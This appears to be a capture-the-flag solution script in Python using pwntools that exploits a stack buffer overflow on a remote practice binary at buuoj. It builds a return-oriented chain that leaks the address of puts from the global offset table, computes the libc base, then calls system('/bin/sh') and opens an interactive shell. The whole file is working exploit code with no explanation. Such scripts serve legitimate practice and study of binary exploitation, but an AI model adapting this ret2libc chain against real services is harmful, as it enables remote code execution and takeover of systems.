from pwn import *
from LibcSearcher import *

context(arch = 'amd64',os = 'linux',log_level = 'debug')
io = remote('node5.buuoj.cn',29797)
elf = ELF('./pwn')
puts_plt_addr = elf.plt['puts']
puts_got_addr = elf.got['puts']
main_addr = 0x0400698
pop_rdi = 0x400753
ret_addr = 0x40050e

payload1 = b'a'*40 + p64(pop_rdi) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(main_addr)

io.sendlineafter('Glad to meet you again!What u bring to me this time?',payload1)
puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))
libc = ELF('./libc-2.31.so')

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search('/bin/sh'))


payload2 = b'a'*40 + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret_addr) + p64(system_addr) 
io.sendline(payload2)
io.interactive()